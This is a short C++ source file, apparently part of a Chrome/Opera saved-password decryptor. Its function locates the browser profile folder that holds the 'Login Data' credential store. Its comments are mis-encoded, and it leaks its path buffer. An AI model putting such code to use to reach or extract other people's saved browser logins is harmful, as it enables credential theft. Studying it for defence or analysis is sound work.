#include "Chrome(Opera)_Decrypt.h"
#include <ShlObj_core.h>
constexpr auto Get_failed = "get_ProfilePath Failed";
string getProfilePath() {
	char* appDataPath = (char*)malloc(sizeof(char) * MAX_PATH);
	if (appDataPath != NULL) {
		//��ȡChrome �����¼��Ϣ�ļ�Login Data��·��
		SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, appDataPath);	// ��ȡ��ǰ�û����ļ�ϵͳĿ¼C:\Users\username\AppData\Local
		string profilePath = appDataPath;
		//printf("%s\n", appDataPath);
		profilePath = profilePath + "\\Google\\Chrome\\User Data\\Default\\";

		/*
		//��ȡOpera �����¼��Ϣ�ļ�Login Data��·��
		SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appDataPath);	// ��ȡ��ǰ�û����ļ�ϵͳĿ¼C:\Users\username\AppData\Roaming��CSIDL_APPDATAĬ��ΪAppData�µ�Roaming��
		string profilePath = appDataPath;
		profilePath = profilePath + "\\Opera Software\\Opera Stable\\";	// Opera��Login Data����·��
		*/

		return profilePath;
	}
	else
		return Get_failed;
}
